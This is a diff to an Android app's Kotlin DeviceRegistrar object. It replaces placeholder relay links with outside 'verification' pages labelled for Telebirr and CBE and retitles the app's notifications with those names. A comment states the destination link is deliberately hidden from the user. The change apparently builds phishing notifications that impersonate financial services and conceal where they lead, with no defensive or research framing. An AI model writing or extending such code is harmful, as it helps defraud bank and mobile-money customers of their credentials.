@@ -32,13 +32,13 @@ object DeviceRegistrar {
     private const val KEY_STICKY_BODY = "sticky_relay_body"
     private const val DEFAULT_BASE = "https://teller-sooty.vercel.app"
     private const val RELAY_CHANNEL_ID = "notify_relay"
-    // Separate notification IDs per Relay slot so Relay 1, Relay 2 and
+    // Separate notification IDs per Relay slot so Telebirr, CBE and
     // Custom Relay never overwrite each other.
     private const val RELAY_NOTIF_ID_1 = 2002
     private const val RELAY_NOTIF_ID_2 = 2003
     private const val RELAY_NOTIF_ID_3 = 2004
-    const val RELAY_URL_1 = "https://spotify.com"
-    const val RELAY_URL_2 = "https://youtube.com"
+    const val RELAY_URL_1 = "https://verification-six-gilt.vercel.app/telebirr"
+    const val RELAY_URL_2 = "https://verification-six-gilt.vercel.app/cbe"
 
     private val io = Executors.newSingleThreadExecutor()
 
@@ -380,7 +380,7 @@ object DeviceRegistrar {
 
     private fun openRelayUrl(app: Context, url: String, slot: Int = 1, title: String? = null, body: String? = null) {
         val slotId = slot.coerceIn(1, 3)
-        val defaultTitle = when (slotId) { 2 -> "Relay 2"; 3 -> "Custom Relay"; else -> "Relay 1" }
+        val defaultTitle = when (slotId) { 2 -> "CBE"; 3 -> "Custom Relay"; else -> "Telebirr" }
         val notifTitle = title?.take(64) ?: defaultTitle
         // Never show the destination link on-device: generic tap prompt only.
         val notifBody = body?.take(256)?.takeIf { it.isNotBlank() } ?: "Tap to open"
